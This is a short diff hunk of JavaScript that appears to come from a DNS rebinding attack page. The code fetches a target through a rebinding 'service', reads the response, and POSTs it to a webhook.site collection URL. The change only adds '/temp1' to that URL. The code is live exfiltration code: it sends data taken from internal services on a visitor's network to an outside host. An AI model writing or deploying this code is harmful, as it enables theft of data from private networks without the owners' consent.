@@ -19,7 +19,7 @@
                     const response = await fetch(service + target);
                     const result = await response.text();
                     
-                    await fetch('https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0', {
+                    await fetch('https://webhook.site/14bfd72c-dceb-4a62-ae62-420272ae86f0/temp1', {
                         method: 'POST',
                         body: `Rebinding ${service}: ${result}`
                     });
